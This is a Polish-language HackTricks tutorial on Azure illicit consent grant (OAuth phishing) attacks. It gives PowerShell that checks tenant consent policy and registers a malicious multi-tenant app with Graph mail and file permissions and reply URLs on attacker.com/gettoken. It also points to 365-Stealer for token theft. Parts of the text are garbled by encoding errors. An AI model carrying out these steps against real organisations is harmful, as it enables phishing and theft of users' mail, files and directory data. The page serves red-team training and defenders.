# Az - Nieuprawnione Udzielenie Zgody

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Phishing Aplikacji OAuth

**Aplikacje Azure** prosz o zezwolenie na dostp do **danych u偶ytkownika** (podstawowe informacje, ale tak偶e dostp do dokument贸w, wysyanie e-maili...).\
Jeli **zezwolone**, zwyky u偶ytkownik mo偶e udzieli zgody tylko na **"Niski wpyw" uprawnie**. W **wszystkich innych** przypadkach **wymagana jest zgoda administratora**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` oraz niestandardowa rola zawierajca `uprawnienia do udzielania uprawnie aplikacjom` mog udzieli zgody na poziomie dzier偶awy.

Tylko uprawnienia, kt贸re **nie wymagaj zgody administratora**, s klasyfikowane jako **niski wpyw**. S to uprawnienia wymagane do **podstawowego logowania openid, profil, e-mail, User.Read i offline\_access**. Jeli **organizacja** **pozwala** na zgod u偶ytkownika dla **wszystkich aplikacji**, pracownik mo偶e udzieli zgody na aplikacj do **odczytu powy偶szych informacji z ich profilu**.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Dlatego atakujcy m贸gby przygotowa **zoliw aplikacj** i za pomoc **phishingu** sprawi, by u偶ytkownik **zaakceptowa aplikacj i skrad jego dane**.

### 2 Typy Atak贸w na Nieuprawnione Udzielenie Zgody

* **Nieuwierzytelnione**: Z zewntrznego konta utw贸rz aplikacj z uprawnieniami `User.Read` i `User.ReadBasic.All` na przykad, z贸w u偶ytkownika za pomoc phishingu, a bdziesz m贸g uzyska dostp do informacji katalogu.
* Wymaga to, aby oszukany u偶ytkownik m贸g akceptowa aplikacje OAuth z zewntrznych rodowisk!
* **Uwierzytelnione**: Majc skompromitowanego podmiotu z wystarczajcymi uprawnieniami, utw贸rz aplikacj wewntrz konta i z贸w jakiego uprzywilejowanego u偶ytkownika, kt贸ry mo偶e zaakceptowa uprzywilejowane uprawnienia OAuth.
* W tym przypadku mo偶esz ju偶 uzyska dostp do informacji z katalogu, wic uprawnienie `User.ReadBasic.All` nie jest ju偶 interesujce.
* Prawdopodobnie interesuj ci **uprawnienia, kt贸re wymagaj zgody administratora**, poniewa偶 surowy u偶ytkownik nie mo偶e udzieli aplikacjom OAuth 偶adnych uprawnie, dlatego musisz **phishowa tylko tych u偶ytkownik贸w** (wicej informacji na temat r贸l/uprawnie, kt贸re nadaj t uprawnienie p贸藕niej)

### Sprawd藕, czy u偶ytkownicy mog udziela zgody

Poni偶sza komenda PowerShell jest u偶ywana do sprawdzenia konfiguracji zgody dla u偶ytkownik贸w w Azure Active Directory (Azure AD) dotyczcej ich zdolnoci do udzielania zgody na aplikacje:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Wycz zgod u偶ytkownika**: To ustawienie zabrania u偶ytkownikom udzielania uprawnie aplikacjom. Nie ma mo偶liwoci udzielenia zgody na aplikacje przez u偶ytkownik贸w.
* **U偶ytkownicy mog wyrazi zgod na aplikacje od zweryfikowanych wydawc贸w lub Twojej organizacji, ale tylko dla wybranych uprawnie**: To ustawienie pozwala wszystkim u偶ytkownikom wyrazi zgod tylko na aplikacje opublikowane przez zweryfikowanego wydawc i aplikacje zarejestrowane w Twoim najemcy. Dodaje warstw kontroli, pozwalajc na zgod tylko na okrelone uprawnienia.
* **U偶ytkownicy mog wyrazi zgod na wszystkie aplikacje**: To ustawienie jest bardziej przychylne i pozwala wszystkim u偶ytkownikom wyrazi zgod na dowolne uprawnienia dla aplikacji, o ile te uprawnienia nie wymagaj zgody administracyjnej.
* **Niestandardowa polityka zgody na aplikacje**: To ustawienie wskazuje, 偶e istnieje niestandardowa polityka, kt贸ra mo偶e by dostosowana do konkretnych wymaga organizacyjnych i mo偶e obejmowa kombinacj ogranicze opartych na wydawcy aplikacji, uprawnieniach 偶danych przez aplikacj i innych czynnikach.

## **Zrozumienie Ataku na Nielegalne Udzielenie Zgody**

W ataku na nielegalne udzielenie zgody, atakujcy oszukuj kocowych u偶ytkownik贸w, aby udzielili uprawnie aplikacji zoliwej zarejestrowanej w Azure. Robi to, sprawiajc, 偶e aplikacja wydaje si by wiarygodna, prowadzc ofiary do niewiadomego kliknicia przycisku "Akceptuj". W rezultacie Azure AD wydaje token dla strony atakujcego, pozwalajc im na dostp i manipulowanie danymi ofiary, takimi jak czytanie lub wysyanie e-maili i dostp do plik贸w, bez koniecznoci posiadania konta organizacyjnego.

## **Przebieg Ataku w Skr贸cie**

Atak obejmuje kilka krok贸w skierowanych przeciwko og贸lnemu przedsibiorstwu. Oto jak m贸gby si rozwin:

1. **Rejestracja Domeny i Hostowanie Aplikacji**: Atakujcy rejestruje domen przypominajc zaufan stron, na przykad "safedomainlogin.com". Pod t domen tworzony jest subdomena (np. "nazwafirmy.safedomainlogin.com"), aby hostowa aplikacj zaprojektowan do przechwytywania kod贸w autoryzacyjnych i 偶dania token贸w dostpu.
2. **Rejestracja Aplikacji w Azure AD**: Nastpnie atakujcy rejestruje Aplikacj Wielotenantow w swoim Najemcy Azure AD, nadajc jej nazw firmy docelowej, aby wydawaa si wiarygodna. Konfiguruj aplikacj Redirect URL, aby wskazywaa na subdomen hostujc zoliw aplikacj.
3. **Konfiguracja Uprawnie**: Atakujcy konfiguruje aplikacj z r贸偶nymi uprawnieniami interfejsu API (np. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Te uprawnienia, raz udzielone przez u偶ytkownika, pozwalaj atakujcemu na wydobycie wra偶liwych informacji w imieniu u偶ytkownika.
4. **Rozpowszechnianie Zoliwych Link贸w**: Atakujcy tworzy link zawierajcy identyfikator klienta zoliwej aplikacji i udostpnia go wybranym u偶ytkownikom, oszukujc ich do wyra偶enia zgody.

## **Wykorzystanie Narzdzi do Ataku**

Atak mo偶e by uatwiony za pomoc narzdzi takich jak [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Przygotowanie Przed Atakiem:

Jeli atakujcy ma pewien poziom dostpu do u偶ytkownika w organizacji ofiary, mo偶e sprawdzi, czy polityka organizacji pozwala u偶ytkownikowi na akceptowanie aplikacji:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Do wykonania ataku, atakujcy musiaby utworzy **now aplikacj w swoim Azure Tenant** (w rejestracji aplikacji), skonfigurowan z uprawnieniami:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` znajduje si w `Microsoft Graph` w `Delegated permissions`. (Uprawnienia aplikacji zawsze bd wymaga dodatkowej zgody).

* `User.ReadBasic.All` to uprawnienie, kt贸re umo偶liwi odczytanie informacji o **wszystkich u偶ytkownikach** w organizacji, jeli zostanie udzielone.
* Pamitaj, 偶e tylko role `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` oraz niestandardowa rola zawierajca `uprawnienie do udzielania uprawnie aplikacjom` mog udzieli zgody na poziomie caego tenantu. Dlatego powiniene **wyudzi dane logowania od u偶ytkownika z jedn z tych r贸l**, jeli chcesz, aby zatwierdzi **aplikacj wymagajc zgody administratora**.

Mo偶esz r贸wnie偶 utworzy aplikacj za pomoc wiersza polece za pomoc:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Sprawd藕 [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer), aby dowiedzie si, jak go skonfigurowa.

{% hint style="warning" %}
Zauwa偶, 偶e uzyskany **token dostpu** bdzie dla **punktu kocowego grafu** z zakresem: `User.Read` i `User.ReadBasic.All` (偶dane uprawnienia). Nie bdziesz w stanie wykonywa innych dziaa (ale wystarcz one do **pobrania informacji o wszystkich u偶ytkownikach** w organizacji).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Mo偶esz r贸wnie偶 u偶y tego narzdzia do przeprowadzenia tego ataku.

## Post-Exploitation

Gdy ju偶 uzyskasz dostp do u偶ytkownika, mo偶esz wykona takie czynnoci jak kradzie偶 poufnych dokument贸w, a nawet przesyanie zainfekowanych plik贸w dokument贸w.

## References

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
